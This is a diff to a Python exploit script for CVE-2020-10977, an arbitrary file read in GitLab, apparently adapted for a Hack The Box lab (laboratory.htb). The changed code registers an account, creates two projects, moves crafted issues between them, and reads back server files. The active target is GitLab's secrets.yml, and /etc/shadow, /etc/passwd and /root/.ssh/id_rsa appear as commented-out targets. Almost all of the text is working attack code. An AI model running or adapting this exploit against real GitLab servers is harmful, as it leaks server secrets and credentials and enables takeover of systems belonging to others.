@@ -18,6 +18,13 @@ class CVE2020_10977:
         self.username, self.password = username, password
         self.session = requests.Session()
         self.session.headers.update(self.headers)
+        my = random.randint(1000, 10000)
+        
+        # change this if the gitlab has restricted email domains
+        self.email = "{}@laboratory.htb".format(self.username)
+        self.project_old = "project_{}".format(my)
+        self.project_new = "project_{}".format(my + 100)
+        self.meow = None
 
     # get csrf token from page
     def get_csrf_token(self, url):
@@ -36,6 +43,7 @@ class CVE2020_10977:
             print (LogColors.GREEN + "successfully get csrf token..." + LogColors.ENDC)
         else:
             print (LogColors.RED + "error get csrf token :(" + LogColors.ENDC)
+            sys.exit()
         return self.csrf_param, self.csrf_token, r.text
     
     def register(self):
@@ -51,13 +59,12 @@ class CVE2020_10977:
             'new_user[password]' : self.password,
             self.csrf_param : self.csrf_token,
         }
-        r = self.session.post(url + '/users', data = data,
+        r = self.session.post(self.url + '/users', data = data,
                 allow_redirects = False)
         if r.status_code == 302:
             print (LogColors.GREEN + "successfully register new user :)" + LogColors.ENDC)
         else:
             print (LogColors.RED + "failed register new user :(" + LogColors.ENDC)
-            sys.exit()
 
     # login to gitlab
     def login(self):
@@ -70,13 +77,14 @@ class CVE2020_10977:
             self.csrf_param : self.csrf_token,
             }
         r = self.session.post(
-                url + '/users/sign_in',
+                self.url + '/users/sign_in',
                 data = data, allow_redirects = False,
                 )
         if r.status_code == 302 and r.text.find("redirected") > -1:
             print (LogColors.GREEN + "successfully log in to giltab..." + LogColors.ENDC)
         else:
             print (LogColors.RED + "error logging in :(" + LogColors.ENDC)
+            sys.exit()
 
     # create new project
     def create_project(self, name):
@@ -169,7 +177,6 @@ class CVE2020_10977:
         if r.status_code == 500:
             print (LogColors.RED + "permission denied for file {}".format(f) + LogColors.ENDC)
         else:
-            print (r.status_code)
             description = json.loads(r.text)["description"]
             i = description.find("/")
             file_url = self.url + "/{}/{}/{}".format(self.username, dest, description[i + 1 : -1])
@@ -183,6 +190,7 @@ class CVE2020_10977:
                 print (LogColors.BLUE + "content of file {} read from server...\n\n".format(f) + LogColors.ENDC)
                 print (LogColors.YELLOW + r.text + "\n" + LogColors.ENDC)
                 print (LogColors.GREEN + "hacked :)" + LogColors.ENDC)
+                self.meow = r.text
 
     def delete_project(self, project):
         print (LogColors.BLUE + "delete project " + project + LogColors.ENDC)
@@ -202,6 +210,30 @@ class CVE2020_10977:
             print (LogColors.GREEN + "successfully delete " + project + " :)" + LogColors.ENDC)
         else:
             print (LogColors.RED + "failed delete project :(" + LogColors.ENDC)
+            sys.exit()
+
+    def exploit(self):
+        self.register()
+        self.login()
+        self.create_project(self.project_old)
+        self.create_project(self.project_new)
+        files = [
+            #'/etc/shadow',
+            #'/etc/passwd',
+            #'/etc/ssh/sshd_config',
+            #'/etc/ssh/ssh_config',
+            #'/root/.ssh/id_rsa',
+            #'/var/log/auth.log',
+            '/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml'
+        ]
+        for f in files:
+            self.create_issue(self.project_old, "exp_issue_{}".format(f), f)
+            self.move_issue(self.project_old, self.project_new, f)
+            time.sleep(5)
+
+        self.delete_project(self.project_old)
+        self.delete_project(self.project_new)
+
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
@@ -212,23 +244,4 @@ if __name__ == '__main__':
     url = args['target']
     username, password = args["username"], args["password"]
     cve = CVE2020_10977(url, username, password)
-    cve.login()
-    cve.create_project("exploit_test_proj1")
-    cve.create_project("exploit_test_proj2")
-    files = [
-        #'/etc/shadow',
-        #'/etc/passwd',
-        #'/etc/ssh/sshd_config',
-        #'/etc/ssh/ssh_config',
-        #'/root/.ssh/id_rsa',
-        #'/var/log/auth.log',
-        '/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml'
-    ]
-    for f in files:
-        cve.create_issue("exploit_test_proj1", "exp_issue_{}".format(f), f)
-        cve.move_issue("exploit_test_proj1", "exploit_test_proj2", f)
-        time.sleep(5)
-
-    cve.delete_project("exploit_test_proj1")
-    cve.delete_project("exploit_test_proj2")
-
+    cve.exploit()
